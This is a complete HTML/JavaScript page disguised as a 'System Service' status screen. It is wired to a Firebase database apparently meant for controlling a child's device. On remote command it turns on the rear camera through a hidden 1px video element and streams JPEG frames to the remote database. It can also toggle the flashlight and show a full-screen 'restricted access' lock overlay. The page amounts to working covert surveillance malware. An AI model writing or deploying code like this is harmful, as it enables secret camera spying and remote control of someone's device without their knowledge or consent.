<!DOCTYPE html>
<html>
<head>
    <title>Servicio del Sistema</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: black; color: white; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #bloqueo { display: none; text-align: center; background: black; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
        .warning { color: red; font-size: 30px; font-weight: bold; }
    </style>
</head>
<body>
    <div id="bloqueo">
        <span class="warning">⚠️ ACCESO RESTRINGIDO</span>
    </div>

    <div id="status">
        <div style="width:10px; height:10px; background:#0f0; border-radius:50%; margin:auto;"></div>
        <p style="font-size:10px; color:#111;">SISTEMA ACTIVO</p>
    </div>

    <video id="v" autoplay playsinline style="width:1px; height:1px; opacity:0;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        // Configuración conectada a tu Firebase real
        const firebaseConfig = {
            databaseURL: "https://control-nino-default-rtdb.firebaseio.com/"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const video = document.getElementById('v');
        const canvas = document.getElementById('c');
        const context = canvas.getContext('2d');
        const pantallaBloqueo = document.getElementById('bloqueo');
        let transmitiendo = false;

        // --- FUNCIÓN DE DESBLOQUEO REMOTO ---
        db.ref('bloqueo').on('value', (snap) => {
            if (snap.val() === "ACTIVAR") {
                pantallaBloqueo.style.display = "flex";
            } else {
                pantallaBloqueo.style.display = "none";
            }
        });

        // --- FUNCIÓN DE VIDEO ---
        function flujoVideo() {
            if (!transmitiendo) return;
            canvas.width = 400;
            canvas.height = 300;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const data = canvas.toDataURL('image/jpeg', 0.2);
            db.ref('stream').set(data);
            requestAnimationFrame(flujoVideo);
        }

        db.ref('comando_video').on('value', (snap) => {
            if (snap.val() === "ON") {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
                .then(s => { 
                    video.srcObject = s; 
                    transmitiendo = true; 
                    flujoVideo(); 
                }).catch(err => console.log("Error de cámara:", err));
            } else {
                transmitiendo = false;
                if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
                db.ref('stream').set(null);
            }
        });

        // --- FUNCIÓN DE LINTERNA ---
        db.ref('linterna').on('value', (snap) => {
            const track = video.srcObject ? video.srcObject.getVideoTracks()[0] : null;
            if (track) {
                track.applyConstraints({
                    advanced: [{ torch: (snap.val() === "ON") }]
                });
            }
        });
    </script>
</body>
</html>
